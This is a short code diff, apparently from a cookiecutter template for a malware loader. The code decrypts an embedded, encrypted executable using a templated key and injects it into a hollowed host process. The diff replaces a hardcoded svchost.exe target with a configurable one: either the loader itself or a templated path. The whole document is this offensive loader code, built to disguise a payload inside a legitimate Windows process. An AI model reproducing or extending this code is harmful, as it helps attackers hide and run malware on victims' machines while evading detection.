@@ -1,6 +1,8 @@
 #include "resource.h"
 #include "processHollower.h"
 
+#define TARGET_EXE_TYPE {{ cookiecutter.target_exe_type}}
+
 VOID DecryptPE(char *lpGuestPEData, DWORD dwResourceSize) {
     char key[] = "{{ cookiecutter.encryption_key }}";
     int keyLength = strlen(key);
@@ -21,13 +23,14 @@ int main() {
     DecryptPE(lpGuestPEData, dwResourceSize);
 
     ProcessHollower PHollower;
-//    char lpHostApplicationName[ MAX_PATH ];
-//    GetModuleFileName(nullptr, lpHostApplicationName, MAX_PATH+1);
-    #ifdef _WIN64
-        char lpHostApplicationName[] = R"(C:\Windows\System32\svchost.exe)";
-    #else
-        char lpHostApplicationName[] = R"(C:\Windows\System32\svchost.exe)";
-    #endif
+
+#if TARGET_EXE_TYPE == 0
+    char lpHostApplicationName[ MAX_PATH ];
+    GetModuleFileName(nullptr, lpHostApplicationName, MAX_PATH+1);
+#else
+    char lpHostApplicationName[] = R"({{ cookiecutter.target_exe }})";
+#endif
+
     if (!PHollower.execute(lpHostApplicationName, lpGuestPEData))
         return -1;
     #ifndef NDEBUG
